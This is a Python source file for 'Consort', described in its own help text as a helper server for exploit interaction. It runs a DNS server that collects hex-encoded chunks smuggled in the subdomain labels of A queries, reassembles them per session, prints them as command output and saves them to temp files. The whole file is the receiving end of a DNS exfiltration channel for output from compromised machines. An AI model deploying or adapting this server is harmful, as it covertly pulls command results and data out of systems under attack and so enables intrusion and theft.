from dnslib.server import DNSServer, DNSLogger
from dnslib import RR, QTYPE, TXT, A
import datetime, os, shutil, base64, struct, textwrap

from os import listdir
from os.path import isfile, join, getsize
import base64
import codecs
import http.server
import argparse
import tempfile

quad_ip = '2620:0:2e60::33'
count = 200

ALL_INTERFACES_IP = '0.0.0.0'
HTTP_PORT = 80

results_map = {}

class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(s):

        global file_path

        """Respond to a GET request."""
        s.send_response(200)
        s.send_header("Content-type", "text/plain")
        s.end_headers()
        s.wfile.write("Test")

class TestResolver:

    def __init__(self, domain):
        self.domain = domain

    def resolve(self,request,handler):

        global count

        ip_str = "127.0.0.1"
        count += 1

        if count > 254:
           count = 0

        ans = None
        # Loop through questions in request
        for q in request.questions:

            #print("Question: %s" % q.qname.idna())
            #print("Type: %s" % QTYPE.get(q.qtype))
            q_domain = str(q.qname.idna().strip('.'))
            #print("Question Domain: %s" % q_domain)
            if self.domain not in q_domain:
               print("[-] Ignoring DNS request for '%s'" % q_domain)
               continue

            if q.qtype == QTYPE.A:

                domain_parts = q_domain.split(".")
                domain_req_arr_len = len(domain_parts)

                encoded_val = domain_parts[0]
                chunk_idx = domain_parts[1]
                random_bit = domain_parts[2]


                #print(encoded_val)
                # try:
                #     decoded = base64.b64decode(b64_val)
                #     self.decoded_file.write(decoded)
                #     print("[*] Decoded: %s" % decoded.decode())
                # except Exception as e:
                #     pass

                if encoded_val == "_":
                    if random_bit in results_map:
                        output_dict = results_map[random_bit]
                        output_bytes = bytearray()

                        # Get the keys, sort them, then output
                        for k,v in sorted(output_dict.items()):
                            output_bytes.extend(v)

                        print("\n[*] Command output:\n======================")
                        print(output_bytes.decode())
                        if len(output_bytes) > 0:
                            with tempfile.NamedTemporaryFile(dir=".",delete=False) as temp:
                                print("[*] Writing output to temp file: %s" % temp.name)
                                temp.write(output_bytes)
                                temp.flush()
                else:
                    try:
                        decoded = codecs.decode(encoded_val, 'hex')
                        if random_bit in results_map:
                            output_dict = results_map[random_bit]
                        else:
                            output_dict = {}
                            results_map[random_bit] = output_dict

                        output_dict[int(chunk_idx)] = decoded

                        #print("[*] Decoded: %s" % decoded.decode())
                    except Exception as e:
                        pass

                ans = RR.fromZone('%s 60 A %s' % (q_domain, ip_str))

            elif q.qtype == QTYPE.AAAA:

                ans = RR.fromZone('%s 60 AAAA %s' % (q_domain, quad_ip))
            else:
                print("Unknown Type: %d" % q.qtype)


        # Reply
        reply = request.reply()
        if ans != None:
            reply.add_answer(*ans)
        return reply


def run(args):

    domain = args.d
    print("[*] Starting DNS server for domain '%s'" % domain)
    logger = DNSLogger(prefix=False)
    resolver = TestResolver(domain)
    server = DNSServer(resolver,port=53,logger=logger,tcp=False)
    server.start()


    # server_class = http.server.HTTPServer
    # try:
    #     httpd = server_class((ALL_INTERFACES_IP, HTTP_PORT), MyHandler)
    #     print("[+] %s - Result Server Starts - %s:%s" % (time.asctime(), ALL_INTERFACES_IP, HTTP_PORT))
    #     httpd.serve_forever()
    # except (KeyboardInterrupt, Exception) as err:
    #     pass


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Consort - Helper server for exploit interaction')
    parser.add_argument('-d',help='Domain', required=True)

    # Parse out arguments
    args = parser.parse_args()

    run(args)
